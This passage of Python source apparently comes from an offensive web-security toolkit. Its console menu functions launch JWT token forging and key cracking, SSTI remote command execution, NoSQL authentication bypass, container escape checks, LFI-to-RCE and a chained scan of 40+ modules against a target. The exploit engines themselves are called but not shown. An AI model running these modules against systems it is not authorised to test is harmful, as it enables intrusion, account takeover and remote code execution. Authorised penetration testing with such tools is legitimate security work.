        """GraphQL Introspection + Schema Extraction"""
        console.print(f"\n[bold red][*] GraphQL Introspection on {self.target}[/bold red]")
        console.print("[dim]Extracting full schema: queries, mutations, types, enums[/dim]")
        
        url = f"{self.protocol}{self.target}"
        graphql_url = Prompt.ask("[cyan]GraphQL endpoint URL[/cyan]", default=f"{url}/graphql")
        
        with console.status("[bold red]Extracting GraphQL schema via introspection...[/bold red]"):
            result = self.graphql_engine.scan_graphql_introspection(graphql_url)
        
        self.results['findings']['graphql_introspection'] = result
        
        if result.get('success'):
            schema = result.get('schema', {})
            console.print("[bold green][+] Schema extracted successfully![/bold green]")
            console.print(f"  [green]Query Type: {schema.get('query_type', 'N/A')}[/green]")
            console.print(f"  [green]Mutation Type: {schema.get('mutation_type', 'N/A')}[/green]")
            console.print(f"  [green]Object Types: {schema.get('object_types', 0)}[/green]")
            console.print(f"  [green]Queries: {len(schema.get('queries', []))}[/green]")
            console.print(f"  [green]Mutations: {len(schema.get('mutations', []))}[/green]")
            
            # Show queries and mutations
            if schema.get('queries'):
                console.print("\n[bold cyan]Available Queries:[/bold cyan]")
                for q in schema['queries'][:15]:
                    args = f"({', '.join(q['args'])})" if q['args'] else ""
                    console.print(f"  [cyan]{q['name']}{args}[/cyan]")
            if schema.get('mutations'):
                console.print("\n[bold red]Available Mutations:[/bold red]")
                for m in schema['mutations'][:15]:
                    args = f"({', '.join(m['args'])})" if m['args'] else ""
                    console.print(f"  [red]{m['name']}{args}[/red]")
        else:
            console.print("[yellow][!] Introspection is disabled[/yellow]")
    
    def _scan_graphql_dos(self):
        """GraphQL DoS Vector Testing"""
        console.print(f"\n[bold red][*] GraphQL DoS Testing on {self.target}[/bold red]")
        console.print("[dim]Testing: Alias overloading, Batch queries, Directive overloading, Circular introspection, Depth[/dim]")
        
        url = f"{self.protocol}{self.target}"
        graphql_url = Prompt.ask("[cyan]GraphQL endpoint URL[/cyan]", default=f"{url}/graphql")
        
        with console.status("[bold red]Testing GraphQL DoS vectors...[/bold red]"):
            result = self.graphql_engine.scan_graphql_dos(graphql_url)
        
        self.results['findings']['graphql_dos'] = result
        
        v_count = result.get('vulnerable_count', 0)
        console.print(f"\n[bold {'red' if v_count else 'green'}]"
                      f"{v_count} DoS vectors found[/bold {'red' if v_count else 'green'}]")
        
        for r in result.get('dos_vectors', []):
            status = "VULN" if r['result'] else "SAFE"
            console.print(f"  [{'red' if r['result'] else 'green'}][{status}] {r['title']}: {r['description']}[/{'red' if r['result'] else 'green'}]")
    
    def _scan_graphql_csrf(self):
        """GraphQL CSRF Testing"""
        console.print(f"\n[bold red][*] GraphQL CSRF Testing on {self.target}[/bold red]")
        console.print("[dim]Testing: GET method support, GET mutations, URL-encoded POST[/dim]")
        
        url = f"{self.protocol}{self.target}"
        graphql_url = Prompt.ask("[cyan]GraphQL endpoint URL[/cyan]", default=f"{url}/graphql")
        
        with console.status("[bold red]Testing GraphQL CSRF vectors...[/bold red]"):
            result = self.graphql_engine.scan_graphql_csrf(graphql_url)
        
        self.results['findings']['graphql_csrf'] = result
        
        v_count = result.get('vulnerable_count', 0)
        console.print(f"\n[bold {'red' if v_count else 'green'}]"
                      f"{v_count} CSRF vectors found[/bold {'red' if v_count else 'green'}]")
        
        for r in result.get('csrf_vectors', []):
            status = "VULN" if r['result'] else "SAFE"
            console.print(f"  [{'red' if r['result'] else 'green'}][{status}] {r['title']}: {r['description']}[/{'red' if r['result'] else 'green'}]")
    
    # ========================================================================
    # v4.0 FUSION - CIPHEY + JWT + SSTI + NoSQL + CONTAINER
    # ========================================================================
    
    def _scan_ciphey_decode(self):
        """Auto-Decode using Ciphey Engine (19 decoders)"""
        console.print(f"\n[bold cyan][*] CIPHEY AUTO-DECODE ENGINE[/bold cyan]")
        run_ciphey_scan(console)
    
    def _scan_hash_identify(self):
        """Hash type identification"""
        console.print(f"\n[bold cyan][*] HASH IDENTIFIER[/bold cyan]")
        run_hash_identifier(console)
    
    def _scan_jwt_full(self):
        """JWT Full Attack Playbook"""
        console.print(f"\n[bold cyan][*] JWT FULL ATTACK PLAYBOOK[/bold cyan]")
        run_jwt_scan(console)
    
    def _scan_jwt_key_confusion(self):
        """JWT Key Confusion Attack (RS256 -> HS256)"""
        console.print(f"\n[bold red][*] JWT KEY CONFUSION ATTACK[/bold red]")
        console.print("[dim]Uses server's RSA public key as HMAC secret[/dim]")
        
        token = Prompt.ask("[cyan]Enter JWT token[/cyan]")
        header, payload, sig = JWTEngine.parse_token(token.strip())
        if not header:
            console.print(f"[red][-] Invalid JWT: {sig}[/red]")
            return
        
        pub_key = Prompt.ask("[cyan]Enter public key or path to public key file[/cyan]")
        key = pub_key
        try:
            with open(pub_key) as f:
                key = f.read()
        except Exception:
            pass
        
        results = JWTEngine.attack_key_confusion(header, payload, key)
        for r in results:
            console.print(f"\n[green][+] Attack: {r['attack']}[/green]")
            console.print(f"[yellow]  {r['description']}[/yellow]")
            console.print(f"[cyan]  Token: {r['token'][:200]}[/cyan]")
    
    def _scan_jwt_alg_none(self):
        """JWT alg:none + Null Signature"""
        console.print(f"\n[bold red][*] JWT alg:none + NULL SIGNATURE[/bold red]")
        
        token = Prompt.ask("[cyan]Enter JWT token[/cyan]")
        header, payload, sig = JWTEngine.parse_token(token.strip())
        if not header:
            console.print(f"[red][-] Invalid JWT: {sig}[/red]")
            return
        
        results = JWTEngine.attack_alg_none(header, payload)
        results += JWTEngine.attack_null_signature(header, payload)
        results += JWTEngine.attack_psychic_signature(header, payload)
        
        console.print(f"\n[green][+] Generated {len(results)} forged tokens![/green]")
        for i, r in enumerate(results, 1):
            console.print(f"\n  [yellow]#{i} {r['attack']}[/yellow]")
            console.print(f"  [dim]{r['description']}[/dim]")
            console.print(f"  [cyan]{r['token'][:150]}[/cyan]")
    
    def _scan_jwt_kid_inject(self):
        """JWT kid Injection + Claim Tampering"""
        console.print(f"\n[bold red][*] JWT kid INJECTION + CLAIM TAMPERING[/bold red]")
        
        token = Prompt.ask("[cyan]Enter JWT token[/cyan]")
        header, payload, sig = JWTEngine.parse_token(token.strip())
        if not header:
            console.print(f"[red][-] Invalid JWT: {sig}[/red]")
            return
        
        # kid injection
        if 'kid' in header:
            results = JWTEngine.attack_kid_injection(header, payload)
            console.print(f"\n[green][+] kid Injection: {len(results)} payloads[/green]")
            for r in results[:5]:
                console.print(f"  [yellow]{r['description']}[/yellow]")
                console.print(f"  [cyan]{r['token'][:150]}[/cyan]")
        else:
            console.print("[yellow][-] No 'kid' claim in header. Testing claim injection...[/yellow]")
        
        # Claim injection
        claim_results = JWTEngine.attack_claim_injection(header, payload)
        console.print(f"\n[green][+] Claim Injection: {len(claim_results)} payloads[/green]")
        for r in claim_results[:7]:
            console.print(f"  [yellow]{r['attack']}[/yellow]")
            console.print(f"  [cyan]{r['token'][:150]}[/cyan]")
    
    def _scan_jwt_crack(self):
        """JWT HMAC Key Cracking"""
        console.print(f"\n[bold yellow][*] JWT HMAC KEY CRACKING[/bold yellow]")
        
        token = Prompt.ask("[cyan]Enter JWT token[/cyan]")
        wordlist = Prompt.ask("[cyan]Wordlist path[/cyan]", default="/usr/share/wordlists/rockyou.txt")
        
        with console.status("[bold green]Cracking HMAC key...", spinner="dots"):
            found = JWTEngine.crack_hmac(token.strip(), wordlist)
        
        if found and not str(found).startswith("Token") and not str(found).startswith("Wordlist"):
            console.print(f"[bold green][+] KEY FOUND: {found}[/bold green]")
        else:
            console.print(f"[yellow][-] {found or 'Key not found in wordlist'}[/yellow]")
    
    def _scan_ssti_detect(self):
        """SSTI Detection (17+ Template Engines)"""
        console.print(f"\n[bold cyan][*] SSTI DETECTION ENGINE[/bold cyan]")
        run_ssti_scan(console)
    
    def _scan_ssti_exploit(self):
        """SSTI Full Exploit (RCE)"""
        console.print(f"\n[bold red][*] SSTI EXPLOIT (RCE)[/bold red]")
        
        url = Prompt.ask("[cyan]Target URL[/cyan]")
        method = Prompt.ask("[cyan]HTTP Method[/cyan]", choices=["GET", "POST"], default="GET")
        params_str = Prompt.ask("[cyan]Parameters (key=value)[/cyan]", default="")
        
        params = {}
        data = {}
        if params_str.strip():
            for pair in params_str.strip().split(','):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    if method == 'GET':
                        params[k.strip()] = v.strip()
                    else:
                        data[k.strip()] = v.strip()
        
        engine = SSTIEngine(target_url=url.strip(), method=method, params=params, data=data)
        
        with console.status("[bold green]Detecting SSTI...", spinner="dots"):
            detection = engine.detect_ssti()
        
        if not detection:
            console.print("[yellow][-] No SSTI detected.[/yellow]")
            return
        
        engine_name = detection[0].get('engine', 'unknown') if detection else 'unknown'
        console.print(f"[green][+] Detected: {engine_name}[/green]")
        
        cmd = Prompt.ask("[cyan]Command to execute[/cyan]", default="id")
        results = engine.exploit_rce(command=cmd, engine=engine_name)
        
        if results:
            for r in results:
                console.print(f"  [green]Output: {r.get('output', 'No output')}[/green]")
        else:
            console.print("[yellow][-] No RCE output. May need blind exploitation.[/yellow]")
    
    def _scan_nosql_detect(self):
        """NoSQL Injection Detection"""
        console.print(f"\n[bold cyan][*] NoSQL INJECTION DETECTION[/bold cyan]")
        run_nosql_scan(console)
    
    def _scan_nosql_bypass(self):
        """NoSQL Auth Bypass"""
        console.print(f"\n[bold red][*] NoSQL AUTH BYPASS[/bold red]")
        
        url = Prompt.ask("[cyan]Login/Auth URL[/cyan]")
        method = Prompt.ask("[cyan]Method[/cyan]", choices=["GET", "POST"], default="POST")
        
        params_str = Prompt.ask("[cyan]Auth parameters (user=admin,pass=test)[/cyan]", default="username=admin,password=test")
        data = {}
        params = {}
        if params_str.strip():
            for pair in params_str.strip().split(','):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    if method == 'POST':
                        data[k.strip()] = v.strip()
                    else:
                        params[k.strip()] = v.strip()
        
        engine = NoSQLEngine(target_url=url.strip(), method=method, params=params, data=data)
        
        with console.status("[bold green]Testing NoSQL auth bypass...", spinner="dots"):
            results = engine.exploit_auth_bypass()
        
        if results:
            console.print("[bold green][+] Auth bypass successful![/bold green]")
            for r in results:
                console.print(f"  [cyan]Technique: {r['technique']}[/cyan]")
                console.print(f"  [green]Evidence: {r['evidence']}[/green]")
        else:
            console.print("[yellow][-] Auth bypass not successful with current parameters.[/yellow]")
    
    def _scan_nosql_extract(self):
        """NoSQL Blind Data Extraction"""
        console.print(f"\n[bold yellow][*] NoSQL BLIND DATA EXTRACTION[/bold yellow]")
        console.print("[dim]Extract database info via blind NoSQL injection[/dim]")
        console.print("[yellow]Use NoSQL injection detection (86) first to find vulnerable params[/yellow]")
        run_nosql_scan(console)
    
    def _scan_container_full(self):
        """Container Security Scan (DEEPCE)"""
        console.print(f"\n[bold cyan][*] CONTAINER SECURITY SCAN (DEEPCE)[/bold cyan]")
        run_container_scan(console)
    
    def _scan_container_escape(self):
        """Container Escape Check"""
        console.print(f"\n[bold red][*] CONTAINER ESCAPE CHECK[/bold red]")
        
        engine = ContainerEngine()
        engine.detect_container()
        engine.check_user()
        engine.check_docker()
        engine.check_capabilities()
        engine.check_privileged()
        engine.check_mounts()
        engine.check_escape_vectors()
        
        if engine.results['escape_vectors']:
            console.print(f"\n[bold red][!] {len(engine.results['escape_vectors'])} ESCAPE VECTORS FOUND![/bold red]")
            for i, esc in enumerate(engine.results['escape_vectors'], 1):
                color = 'red' if esc['severity'] == 'CRITICAL' else 'yellow'
                console.print(f"\n  [{color}][{esc['severity']}] {esc['method']}[/{color}]")
                console.print(f"  {esc['description']}")
                console.print(f"  [cyan]Exploit: {esc['exploit']}[/cyan]")
        else:
            console.print("\n[green][+] No container escape vectors detected.[/green]")
            if not engine.results['container_detected']:
                console.print("[yellow]  Note: Not running inside a container.[/yellow]")
    
    # ========================================================================
    # v4.1 FUSION - WAF EVASION + WEBSOCKET + SMUGGLING + CRLF + REDIRECT + 403
    # ========================================================================
    
    def _scan_waf_evasion(self):
        """WAF Detection + Bypass Generator"""
        console.print(f"\n[bold cyan][*] WAF EVASION ENGINE[/bold cyan]")
        run_waf_scan(console)
    
    def _scan_websocket(self):
        """WebSocket Security Scanner"""
        console.print(f"\n[bold cyan][*] WEBSOCKET SECURITY SCANNER[/bold cyan]")
        run_websocket_scan(console)
    
    def _scan_smuggling_adv(self):
        """HTTP Request Smuggling Detection (Advanced)"""
        console.print(f"\n[bold cyan][*] HTTP REQUEST SMUGGLING ENGINE[/bold cyan]")
        run_smuggling_scan(console)
    
    def _scan_crlf_adv(self):
        """CRLF Injection Scanner (Advanced)"""
        console.print(f"\n[bold cyan][*] CRLF INJECTION SCANNER[/bold cyan]")
        run_crlf_scan(console)
    
    def _scan_openredirect_adv(self):
        """Open Redirect Scanner (Advanced)"""
        console.print(f"\n[bold cyan][*] OPEN REDIRECT SCANNER[/bold cyan]")
        run_openredirect_scan(console)
    
    def _scan_403bypass(self):
        """403 Bypass Scanner"""
        console.print(f"\n[bold cyan][*] 403 BYPASS ENGINE[/bold cyan]")
        run_403bypass_scan(console)
    
    def _scan_paramspider(self):
        """ParamSpider - Historical Parameter Mining"""
        console.print(f"\n[bold cyan][*] PARAMSPIDER ENGINE[/bold cyan]")
        run_paramspider(console)
    
    def _scan_linkfinder(self):
        """LinkFinder + SecretFinder - JS Analysis"""
        console.print(f"\n[bold cyan][*] LINKFINDER + SECRETFINDER[/bold cyan]")
        run_linkfinder(console)
    
    def _scan_arjun(self):
        """Arjun - Hidden Parameter Discovery"""
        console.print(f"\n[bold cyan][*] ARJUN - HIDDEN PARAMETER DISCOVERY[/bold cyan]")
        run_arjun(console)
    
    def _scan_ghauri(self):
        """Ghauri - WAF Bypass SQLi"""
        console.print(f"\n[bold cyan][*] GHAURI - WAF BYPASS SQLI[/bold cyan]")
        run_ghauri(console)
    
    def _scan_cmseek(self):
        """CMSeeK - CMS Detection"""
        console.print(f"\n[bold cyan][*] CMSEEK - CMS DETECTION[/bold cyan]")
        run_cmseek(console)
    
    def _scan_sherlock(self):
        """Sherlock - Username Hunter"""
        console.print(f"\n[bold cyan][*] SHERLOCK - USERNAME HUNTER[/bold cyan]")
        run_sherlock(console)
    
    def _scan_tehqeeq(self):
        """TEHQEEQ - Pakistani Recon"""
        console.print(f"\n[bold cyan][*] TEHQEEQ تحقیق - PAKISTANI RECON[/bold cyan]")
        run_tehqeeq(console)


    def _scan_bounty_recon(self):
        """Bug Bounty Full Recon Pipeline - All recon modules"""
        console.print(f"\n[bold yellow][*] BUG BOUNTY RECON PIPELINE on {self.target}[/bold yellow]")
        recon_scans = [
            self._scan_full_recon, self._scan_deep_crawl, self._scan_param_mining,
            self._scan_wayback, self._scan_google_dork, self._scan_github_dork,
            self._scan_deep_js, self._scan_takeover,
        ]
        for scan_func in recon_scans:
            try:
                saved_findings = self.results.get('findings', {})
                scan_func()
                new_findings = self.results.get('findings', {})
                saved_findings.update(new_findings)
                self.results['findings'] = saved_findings
            except Exception as e:
                console.print(f"[dim red][!] Error in {scan_func.__name__}: {str(e)[:60]}[/dim red]")
        console.print(f"\n[bold green][+] Bug Bounty Recon Pipeline Complete![/bold green]")
    
    def _scan_bounty_vuln(self):
        """Bug Bounty Full Vulnerability Pipeline - All vuln modules"""
        console.print(f"\n[bold red][*] BUG BOUNTY VULN PIPELINE on {self.target}[/bold red]")
        vuln_scans = [
            self._scan_sqli, self._scan_xss, self._scan_ssrf, self._scan_ssti,
            self._scan_lfi, self._scan_xxe, self._scan_idor, self._scan_cors,
            self._scan_openredirect, self._scan_crlf, self._scan_race,
            self._scan_jwt, self._scan_broken_auth, self._scan_cache_poison,
            self._scan_host_header,
        ]
        for scan_func in vuln_scans:
            try:
                saved_findings = self.results.get('findings', {})
                scan_func()
                new_findings = self.results.get('findings', {})
                saved_findings.update(new_findings)
                self.results['findings'] = saved_findings
            except Exception as e:
                console.print(f"[dim red][!] Error in {scan_func.__name__}: {str(e)[:60]}[/dim red]")
        console.print(f"\n[bold green][+] Bug Bounty Vuln Pipeline Complete![/bold green]")
    
    # ========================================================================
    # V2.0 NUCLEAR MODULE SCAN IMPLEMENTATIONS
    # ========================================================================
    
    def _scan_api_fuzzer(self):
        """API Endpoint Discovery + Fuzzer (V2.0)"""
        console.print(f"\n[bold magenta][*] API Endpoint Discovery + Fuzzer on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold magenta]Discovering and fuzzing API endpoints...[/bold magenta]"):
            result = self.v2_vuln.discover_api_endpoints(url)
        
        self.results['findings']['api_fuzzer'] = result
        
        if result and result.get('discovered_endpoints'):
            e_table = Table(title=f"API Endpoints Discovered: {result['total_endpoints']}", 
                          box=box.DOUBLE, border_style="bright_magenta")
            e_table.add_column("Endpoint", style="cyan")
            e_table.add_column("Status", style="green")
            e_table.add_column("Type", style="yellow")
            e_table.add_column("Vulns", style="red")
            
            for ep in result['discovered_endpoints']:
                is_api = "Yes" if ep.get('is_api') else "No"
                vuln_count = len(ep.get('vulnerabilities', []))
                status_color = "green" if ep['status_code'] == 200 else "yellow"
                e_table.add_row(
                    ep['path'],
                    f"[{status_color}]{ep['status_code']}[/{status_color}]",
                    is_api,
                    str(vuln_count) if vuln_count > 0 else "-"
                )
            console.print(e_table)
            
            if result.get('swagger_docs'):
                console.print("\n[bold red][!] API Documentation Exposed:[/bold red]")
                for doc in result['swagger_docs']:
                    console.print(f"  [red]*[/red] {doc['path']} (Status: {doc['status_code']})")
            
            if result.get('vulnerabilities'):
                v_table = Table(title=f"API Vulnerabilities Found: {result['total_vulns']}", 
                              box=box.HEAVY, border_style="bold red")
                v_table.add_column("Type", style="red")
                v_table.add_column("Endpoint", style="cyan")
                v_table.add_column("Severity", style="yellow")
                v_table.add_column("Description", style="white")
                for v in result['vulnerabilities']:
                    v_table.add_row(
                        v.get('type', ''),
                        v.get('endpoint', ''),
                        v.get('severity', ''),
                        v.get('description', '')[:60]
                    )
                console.print(v_table)
        else:
            console.print("[bold yellow][!] No API endpoints discovered[/bold yellow]")
    
    def _scan_rate_limit(self):
        """Rate Limit Tester (V2.0)"""
        console.print(f"\n[bold magenta][*] Rate Limit Testing on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold magenta]Sending rapid requests to test rate limiting...[/bold magenta]"):
            result = self.v2_vuln.test_rate_limiting(url)
        
        self.results['findings']['rate_limit'] = result
        
        if result and result.get('missing_rate_limit'):
            console.print(f"\n[bold red][!] {result['total_missing']} endpoints missing rate limiting![/bold red]")
            r_table = Table(title="Missing Rate Limiting", box=box.HEAVY, border_style="bold red")
            r_table.add_column("Endpoint", style="cyan")
            r_table.add_column("Severity", style="red")
            r_table.add_column("Details", style="yellow")
            for ep in result['missing_rate_limit']:
                r_table.add_row(
                    ep['endpoint'],
                    f"[red]{ep['severity']}[/red]",
                    ep['description'][:60]
                )
            console.print(r_table)
        else:
            console.print("[bold green][+] Rate limiting appears to be in place on tested endpoints[/bold green]")
        
        # Show summary of all tested endpoints
        if result and result.get('endpoints_tested'):
            s_table = Table(title="Rate Limit Test Summary", box=box.ROUNDED, border_style="cyan")
            s_table.add_column("Endpoint", style="cyan")
            s_table.add_column("Sent", style="yellow")
            s_table.add_column("Success", style="green")
            s_table.add_column("Verdict", style="bold")
            for ep in result['endpoints_tested']:
                verdict_color = "red" if 'NO' in ep.get('verdict', '') else "green" if 'RATE' in ep.get('verdict', '') else "dim"
                s_table.add_row(
                    ep['endpoint'],
                    str(ep['requests_sent']),
                    str(ep['successful']),
                    f"[{verdict_color}]{ep.get('verdict', 'N/A')}[/{verdict_color}]"
                )
            console.print(s_table)
    
    def _scan_sensitive_files(self):
        """Sensitive File Deep Scanner (V2.0)"""
        console.print(f"\n[bold magenta][*] Sensitive File Deep Scan on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold magenta]Scanning for 100+ sensitive file patterns...[/bold magenta]"):
            result = self.v2_vuln.scan_sensitive_files(url)
        
        self.results['findings']['sensitive_files'] = result
        
        if result and result.get('found_files'):
            # Critical exposures first
            if result.get('critical_exposures'):
                console.print(f"\n[bold red][!!!] {result['total_critical']} CRITICAL EXPOSURES FOUND![/bold red]")
                for exp in result['critical_exposures']:
                    console.print(f"  [bold red]*[/bold red] {exp['url']} - {exp.get('severity', '').upper()}")
                    if exp.get('contains_secrets'):
                        console.print(f"    [red]Contains secrets/passwords![/red]")
                    if exp.get('git_exposed'):
                        console.print(f"    [red]Git repository exposed![/red]")
                    if exp.get('db_dump_exposed'):
                        console.print(f"    [red]Database dump exposed![/red]")
            
            f_table = Table(title=f"Sensitive Files Found: {result['total_found']}", 
                          box=box.DOUBLE, border_style="bright_red")
            f_table.add_column("Path", style="cyan")
            f_table.add_column("Status", style="green")
            f_table.add_column("Size", style="yellow")
            f_table.add_column("Severity", style="bold")
            
            # Sort by severity
            severity_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4}
            sorted_files = sorted(result['found_files'], 
                                key=lambda x: severity_order.get(x.get('severity', 'info'), 5))
            
            for f in sorted_files[:50]:
                sev = f.get('severity', 'info')
                sev_color = "red" if sev == 'critical' else "yellow" if sev == 'high' else "green" if sev == 'medium' else "dim"
                f_table.add_row(
                    f['path'],
                    str(f['status_code']),
                    str(f.get('size', '')),
                    f"[{sev_color}]{sev}[/{sev_color}]"
                )
            console.print(f_table)
            if result['total_found'] > 50:
                console.print(f"[yellow]... and {result['total_found'] - 50} more files[/yellow]")
        else:
            console.print("[bold green][+] No sensitive files detected[/bold green]")
    
    def _scan_email_enum(self):
        """Email Enumeration (V2.0)"""
        console.print(f"\n[bold magenta][*] Email Enumeration on {self.target}[/bold magenta]")
        domain = self.target.replace('www.', '')
        
        with console.status("[bold magenta]Enumerating email addresses...[/bold magenta]"):
            result = self.v2_recon.enumerate_emails(domain)
        
        self.results['findings']['email_enum'] = result
        
        if result and result.get('emails'):
            e_table = Table(title=f"Emails Found: {result['total_found']}", 
                          box=box.DOUBLE, border_style="bright_cyan")
            e_table.add_column("#", style="dim")
            e_table.add_column("Email", style="cyan")
            e_table.add_column("Source", style="yellow")
            
            for i, email in enumerate(result['emails'][:50], 1):
                source = 'multi'
                for src, emails in result.get('sources', {}).items():
                    if email in emails:
                        source = src
                        break
                if any(email.startswith(p.split('@')[0]) for p in result.get('patterns_generated', [])):
                    source = 'pattern-generated'
                e_table.add_row(str(i), email, source)
            console.print(e_table)
        else:
            console.print("[bold yellow][!] No emails found[/bold yellow]")
        
        if result and result.get('mx_records'):
            console.print(f"\n[cyan]MX Records:[/cyan] {', '.join(result['mx_records'])}")
    
    def _scan_broken_links(self):
        """Broken Link Hijacker (V2.0)"""
        console.print(f"\n[bold magenta][*] Broken Link Hijacking Scan on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold magenta]Crawling page and checking external links...[/bold magenta]"):
            result = self.v2_recon.check_broken_links(url)
        
        self.results['findings']['broken_links'] = result
        
        console.print(f"\n[cyan]Total links on page:[/cyan] {result.get('total_links', 0)}")
        console.print(f"[cyan]External links:[/cyan] {result.get('external_links', 0)}")
        console.print(f"[cyan]Broken links:[/cyan] {result.get('total_broken', 0)}")
        
        if result and result.get('hijackable'):
            console.print(f"\n[bold red][!] {result['total_hijackable']} HIJACKABLE broken links found![/bold red]")
            h_table = Table(title="Hijackable Domains", box=box.HEAVY, border_style="bold red")
            h_table.add_column("Broken URL", style="red")
            h_table.add_column("Domain", style="cyan")
            h_table.add_column("Status", style="yellow")
            for link in result['hijackable']:
                h_table.add_row(
                    link['url'][:60],
                    link['domain'],
                    str(link['status_code'])
                )
            console.print(h_table)
        elif result and result.get('broken_links'):
            b_table = Table(title=f"Broken Links: {result['total_broken']}", 
                          box=box.ROUNDED, border_style="yellow")
            b_table.add_column("URL", style="red")
            b_table.add_column("Status", style="yellow")
            b_table.add_column("Server", style="dim")
            for link in result['broken_links']:
                b_table.add_row(
                    link['url'][:60],
                    str(link['status_code']),
                    link.get('server', '')[:30]
                )
            console.print(b_table)
        else:
            console.print("[bold green][+] No broken external links found[/bold green]")
    
    def _scan_tech_cve(self):
        """Technology Version + CVE Lookup (V2.0)"""
        console.print(f"\n[bold magenta][*] Tech Version + CVE Lookup on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold magenta]Detecting technology versions and looking up CVEs...[/bold magenta]"):
            result = self.v2_recon.detect_tech_versions(url)
        
        self.results['findings']['tech_cve'] = result
        
        if result and result.get('technologies'):
            t_table = Table(title=f"Technologies with Versions: {result['total_techs']}", 
                          box=box.DOUBLE, border_style="bright_cyan")
            t_table.add_column("Technology", style="cyan")
            t_table.add_column("Version", style="green")
            t_table.add_column("Source", style="yellow")
            t_table.add_column("CVEs", style="red")
            
            for tech in result['technologies']:
                cve_count = len(tech.get('cves', []))
                t_table.add_row(
                    tech['name'],
                    tech['version'],
                    tech.get('source', ''),
                    str(cve_count) if cve_count > 0 else "-"
                )
            console.print(t_table)
            
            # Show CVEs
            if result.get('cves'):
                risk = result.get('risk_summary', {})
                console.print(f"\n[bold red]CVE Risk Summary:[/bold red] "
                            f"[red]Critical: {risk.get('critical', 0)}[/red] | "
                            f"[yellow]High: {risk.get('high', 0)}[/yellow] | "
                            f"[cyan]Medium: {risk.get('medium', 0)}[/cyan] | "
                            f"[green]Low: {risk.get('low', 0)}[/green]")
                
                c_table = Table(title=f"CVEs Found: {result['total_cves']}", 
                              box=box.HEAVY, border_style="bold red")
                c_table.add_column("CVE ID", style="red")
                c_table.add_column("Technology", style="cyan")
                c_table.add_column("CVSS", style="yellow")
                c_table.add_column("Severity", style="bold")
                c_table.add_column("Summary", style="white")
                
                for tech in result['technologies']:
                    for cve in tech.get('cves', []):
                        sev = cve.get('severity', 'medium')
                        sev_color = "red" if sev == 'critical' else "yellow" if sev == 'high' else "green"
                        c_table.add_row(
                            cve.get('id', ''),
                            tech['name'],
                            str(cve.get('cvss', 0)),
                            f"[{sev_color}]{sev}[/{sev_color}]",
                            cve.get('summary', '')[:50]
                        )
                console.print(c_table)
        else:
            console.print("[bold yellow][!] No technology versions detected[/bold yellow]")
    
    def _scan_mega(self):
        """MEGA SCAN - Every single module"""
        console.print(f"\n[bold red][!!!] MEGA SCAN INITIATED on {self.target}[/bold red]")
        console.print("[bold yellow][*] Running ALL 40+ modules... Grab some coffee.[/bold yellow]")
        # Original modules
        self._scan_full_recon()
        self._scan_whois()
        self._scan_geoip()
        self._scan_dns()
        self._scan_subdomains()
        self._scan_ports()
        self._scan_banners()
        self._scan_headers()
        self._scan_ssl()
        self._scan_sqli()
        self._scan_xss()
        self._scan_dirbrute()
        self._scan_wordpress()
        self._scan_cors()
        self._scan_openredirect()
        self._scan_crlf()
        self._scan_cookies()
        self._scan_javascript()
        self._scan_cloudbuckets()
        self._scan_waf()
        self._scan_techstack()
        # Bug Bounty Arsenal
        self._scan_deep_crawl()
        self._scan_param_mining()
        self._scan_wayback()
        self._scan_google_dork()
        self._scan_github_dork()
        self._scan_deep_js()
        self._scan_takeover()
        self._scan_ssrf()
        self._scan_ssti()
        self._scan_lfi()
        self._scan_xxe()
        self._scan_idor()
        self._scan_race()
        self._scan_proto_pollution()
        self._scan_cache_poison()
        self._scan_smuggling()
        self._scan_host_header()
        self._scan_jwt()
        self._scan_broken_auth()
        # V2.0 Nuclear Modules
        self._scan_api_fuzzer()
        self._scan_rate_limit()
        self._scan_sensitive_files()
        self._scan_email_enum()
        self._scan_broken_links()
        self._scan_tech_cve()
        # Origin IP Finder
        self._scan_origin_ip_quick()
        # SSRF Exploitation (v3.0 Fusion)
        self._scan_ssrf_detect()
        # Race Condition (v3.0 Fusion)
        self._scan_race_single()
        # GraphQL Security (v3.0 Fusion)
        self._scan_graphql_discover()
        # Generate mega report
        self.reports.generate_html_report(self.results, self.target)
        console.print(f"\n[bold green][+] MEGA SCAN COMPLETE! Full report generated.[/bold green]")

    # ========================================================================
    # v5.0 FUSION SCAN IMPLEMENTATIONS - ALL NEW ENGINES
    # ========================================================================

    def _scan_lfi_detect(self):
        """LFI Detection (Multi-depth + Multi-encoding)"""
        console.print(f"\n[bold cyan][*] LFI Detection on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing LFI with 8 depth levels + 8 encodings...[/bold cyan]"):
            result = run_lfi_scan(url, parameter="file", scan_type="detect")
        self.results['findings']['lfi_detect'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] LFI VULNERABLE! OS: {result.get('os_detected', 'Unknown')}[/bold red]")
            for tech in result.get('techniques_found', [])[:3]:
                console.print(f"  [yellow]Depth {tech['depth']}, Encoding: {tech['encoding']}, Payload: {tech['payload'][:50]}[/yellow]")
        else:
            console.print("[green][+] No LFI vulnerability detected[/green]")

    def _scan_lfi_exploit(self):
        """LFI PHP Wrapper Exploitation"""
        console.print(f"\n[bold cyan][*] LFI PHP Wrapper Exploitation on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing PHP wrappers for source code extraction...[/bold cyan]"):
            result = run_lfi_scan(url, parameter="file", scan_type="php_wrapper")
        self.results['findings']['lfi_wrapper'] = result
        if result.get('vulnerable'):
            for w in result.get('wrappers_working', []):
                console.print(f"  [green][+] Wrapper {w['wrapper']} works! Length: {w.get('decoded_length', w.get('content_length', 0))}[/green]")
        else:
            console.print("[yellow][!] No PHP wrappers working[/yellow]")

    def _scan_lfi_rce(self):
        """LFI to RCE (php://input + Log Poisoning)"""
        console.print(f"\n[bold red][*] LFI to RCE on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Attempting LFI to RCE via php://input + log poisoning...[/bold red]"):
